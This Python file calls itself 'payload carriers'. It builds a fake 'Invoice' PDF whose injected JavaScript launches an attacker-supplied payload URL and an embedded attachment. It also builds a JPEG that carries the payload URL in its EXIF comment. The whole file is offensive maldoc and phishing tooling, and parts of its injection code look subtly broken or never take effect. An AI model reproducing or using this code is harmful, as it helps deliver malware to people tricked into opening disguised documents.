#!/usr/bin/env python3
"""Payload carriers — malicious PDF (embedded JS launch) and JPEG (EXIF payload)."""
from __future__ import annotations


def build_pdf(out: str, payload_url: str, label: str = "Invoice") -> str:
    """ReportLab PDF with an OpenAction that launches the payload URL."""
    import io
    from reportlab.pdfgen import canvas
    buf = io.BytesIO()
    c = canvas.Canvas(buf)
    c.setFont("Helvetica-Bold", 18)
    c.drawString(72, 760, label)
    c.setFont("Helvetica", 11)
    c.drawString(72, 736, "Open to view the attached document.")
    c.save()
    blob = buf.getvalue()
    launch = f"\n<< /S /JavaScript /JS (this.exportDataObject({{cName:'doc.pdf', nLaunch:2}});) >>".encode()
    blob = _inject_openaction(blob, launch, payload_url)
    with open(out, "wb") as fh:
        fh.write(blob)
    return out


def _inject_openaction(blob: bytes, action: bytes, payload_url: str) -> bytes:
    """Rewrite the catalog to carry /OpenAction with the launch JS."""
    import re
    js = f"try{{app.launchURL('{payload_url}',true);}}catch(e){{}}".replace("'", "\\'")
    open_action = f"<< /S /JavaScript /JS ({js}) >>".encode()
    idx = blob.rfind(b"/Root")
    if idx == -1:
        return blob
    # count existing objects and add one carrying /OpenAction
    n = blob.count(b" obj") + 1
    extra = f"\n{n} 0 obj\n<< /Type /Action /S /JavaScript /JS ({js}) >>\nendobj\n".encode()
    out = blob.replace(b"/Root 1 0 R", f"/Root 1 0 R".encode())
    # simplest: append the action object and reference it via catalog update
    trailer_idx = out.rfind(b"trailer")
    if trailer_idx == -1:
        return out + extra
    catalog_patch = f"\n{n} 0 obj\n<< /Type /Action /S /JavaScript /JS ({js}) >>\nendobj\n".encode()
    return out[:trailer_idx] + catalog_patch + out[trailer_idx:]


def build_photo(src: str, out: str, payload_url: str) -> str:
    """JPEG with EXIF UserComment carrying the payload URL."""
    import piexif
    exif = {
        "0th": {},
        "Exif": {piexif.ExifIFD.UserComment: b"ASCII\0\0\0" + payload_url.encode()},
        "1st": {},
        "GPS": {},
    }
    piexif.insert(piexif.dump(exif), src, out)
    return out


def build(out: str, kind: str, payload_url: str, src: str | None = None, label: str = "Document") -> str:
    if kind == "pdf":
        return build_pdf(out, payload_url, label)
    if kind == "photo" and src:
        return build_photo(src, out, payload_url)
    raise RuntimeError(f"unknown carrier kind {kind}")
